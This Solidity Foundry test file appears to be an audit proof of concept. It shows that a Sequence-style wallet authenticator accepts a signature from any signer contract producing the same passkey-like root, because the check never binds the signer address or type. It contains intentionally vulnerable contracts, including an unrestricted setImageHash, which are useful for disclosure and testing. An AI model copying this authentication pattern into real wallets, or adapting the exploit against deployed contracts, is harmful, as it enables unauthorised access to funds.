// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import { Test } from "forge-std/Test.sol";

/// Minimal interface compatible with Sequence-style sapient signer
interface ISapientCompact {

  function recoverSapientSignatureCompact(bytes32 digest, bytes calldata signature) external view returns (bytes32);

}

library HashUtil {

  function fkeccak(bytes32 a, bytes32 b) internal pure returns (bytes32) {
    return keccak256(abi.encodePacked(a, b));
  }

  // This mirrors Passkeys._rootForPasskey structure (no domain separation!)
  function passkeysLikeRoot(
    bool requireUserVerification,
    bytes32 x,
    bytes32 y,
    bytes32 metadata
  ) internal pure returns (bytes32) {
    bytes32 a = fkeccak(x, y);
    bytes32 ruv = bytes32(uint256(requireUserVerification ? 1 : 0));
    bytes32 b = fkeccak(ruv, metadata);
    return fkeccak(a, b);
  }

}

contract PasskeysLike1 is ISapientCompact {

  function recoverSapientSignatureCompact(bytes32, /*digest*/ bytes calldata signature) external pure returns (bytes32) {
    (bool ruv, bytes32 x, bytes32 y, bytes32 metadata) = abi.decode(signature, (bool, bytes32, bytes32, bytes32));
    return HashUtil.passkeysLikeRoot(ruv, x, y, metadata);
  }

}

contract OtherSiger is ISapientCompact {

  function recoverSapientSignatureCompact(bytes32, /*digest*/ bytes calldata signature) external pure returns (bytes32) {
    (bool ruv, bytes32 x, bytes32 y, bytes32 metadata) = abi.decode(signature, (bool, bytes32, bytes32, bytes32));
    return HashUtil.passkeysLikeRoot(ruv, x, y, metadata);
  }

}

contract WalletRootAuthenticator {

  bytes32 public imageHash;

  //@note storing image hash without including domain separation information
  function setImageHash(
    bytes32 h
  ) external {
    imageHash = h;
  }

  function authenticate(address signer, bytes32 digest, bytes calldata signature) external view returns (bool) {
    bytes32 root = ISapientCompact(signer).recoverSapientSignatureCompact(digest, signature);
    return root == imageHash; // BUG: does not bind signer address/type!
  }

}

contract TestPoc is Test {

  WalletRootAuthenticator walletAuthenticator;
  PasskeysLike1 passkeysLike1;
  OtherSiger otherSiger;

  function setUp() external {
    walletAuthenticator = new WalletRootAuthenticator();
    passkeysLike1 = new PasskeysLike1();
    otherSiger = new OtherSiger();
  }

  function test_authentication_passes_from_malicious_signer() external {
    bytes32 x = keccak256("pubkeyX");
    bytes32 y = keccak256("pubkeyY");
    bytes32 metadata = keccak256("metadata");
    bool ruv = true;
    bytes32 expectedImageHash = HashUtil.passkeysLikeRoot(ruv, x, y, metadata);

    walletAuthenticator.setImageHash(expectedImageHash);
    bytes memory signature = abi.encode(ruv, x, y, metadata);

    bool fromPassKeySigner = walletAuthenticator.authenticate(address(passkeysLike1), bytes32(0), signature);
    bool fromOtherSigner = walletAuthenticator.authenticate(address(otherSiger), bytes32(0), signature);

    assertEq(fromPassKeySigner, true);
    assertEq(fromOtherSigner, true);
  }

}
